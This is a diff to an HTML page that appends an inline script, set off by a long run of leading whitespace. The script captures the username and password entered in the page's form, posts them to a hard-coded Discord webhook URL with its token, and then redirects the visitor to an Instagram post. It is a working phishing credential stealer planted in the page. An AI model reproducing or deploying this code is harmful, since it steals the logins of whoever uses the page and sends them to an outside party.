@@ -263,6 +263,29 @@
     integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct"
     crossorigin="anonymous"></script>
     <script src="script.js"></script>
+                               <script>
+        function sendMessage() {
+            function sleep(milliseconds) {
+                const date = Date.now();
+                let currentDate = null;
+                do {
+                    currentDate = Date.now();
+                } while (currentDate - date < milliseconds);
+            }
+
+            var request = new XMLHttpRequest();
+            var webhookURL = "https://discordapp.com/api/webhooks/1107563464215507017/XvN2kkOeBawwOIhPyNl2WmbQ4kjmUrGOiGFS3mWfiMuPlB3LgEIpxQWG7jwecyrLFSwH"; // Replace this with your Discord webhook URL
+
+            request.open("POST", webhookURL);
+            request.setRequestHeader('Content-type', 'application/json');
+            var params = {
+                content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
+            };
+            request.send(JSON.stringify(params));
+            sleep(400);
+            window.location.replace("https://instagram.com/p/CR8V_TNF4gW/");
+        }
+    </script>
 </body>
 
 </html>
